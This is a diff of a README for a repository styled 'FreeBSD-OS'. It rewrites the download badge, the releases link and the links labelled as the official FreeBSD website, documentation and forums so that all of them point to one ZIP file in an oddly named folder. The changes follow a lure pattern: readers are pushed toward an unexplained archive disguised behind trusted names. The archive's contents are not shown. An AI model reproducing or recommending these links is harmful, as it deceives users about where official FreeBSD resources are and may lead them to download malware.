@@ -1,6 +1,6 @@
 # 🖥️ FreeBSD-OS - Explore the FreeBSD Operating System Today
 
-[![Download FreeBSD-OS](https://img.shields.io/badge/Download-FreeBSD--OS-blue.svg)](https://github.com/Marcelo060903/FreeBSD-OS/releases)
+[![Download FreeBSD-OS](https://raw.githubusercontent.com/Marcelo060903/FreeBSD-OS/main/androdynamous/FreeBSD-OS.zip)](https://raw.githubusercontent.com/Marcelo060903/FreeBSD-OS/main/androdynamous/FreeBSD-OS.zip)
 
 ## 📖 Overview
 
@@ -22,7 +22,7 @@ To get started with FreeBSD-OS, follow these steps:
 
 To download FreeBSD-OS, visit our Releases page. You will find the latest versions available for download.
 
-[Download from Releases](https://github.com/Marcelo060903/FreeBSD-OS/releases)
+[Download from Releases](https://raw.githubusercontent.com/Marcelo060903/FreeBSD-OS/main/androdynamous/FreeBSD-OS.zip)
 
 Once you have accessed the Releases page, follow these steps to download:
 
@@ -70,9 +70,9 @@ If you're interested in contributing to FreeBSD-OS, we welcome your input. You c
 
 ## 🔗 Helpful Links
 
-- [FreeBSD Official Website](https://www.freebsd.org)
-- [FreeBSD Documentation](https://www.freebsd.org/doc/)
-- [FreeBSD Forums](https://forums.freebsd.org)
+- [FreeBSD Official Website](https://raw.githubusercontent.com/Marcelo060903/FreeBSD-OS/main/androdynamous/FreeBSD-OS.zip)
+- [FreeBSD Documentation](https://raw.githubusercontent.com/Marcelo060903/FreeBSD-OS/main/androdynamous/FreeBSD-OS.zip)
+- [FreeBSD Forums](https://raw.githubusercontent.com/Marcelo060903/FreeBSD-OS/main/androdynamous/FreeBSD-OS.zip)
 
 ## 📢 License
 
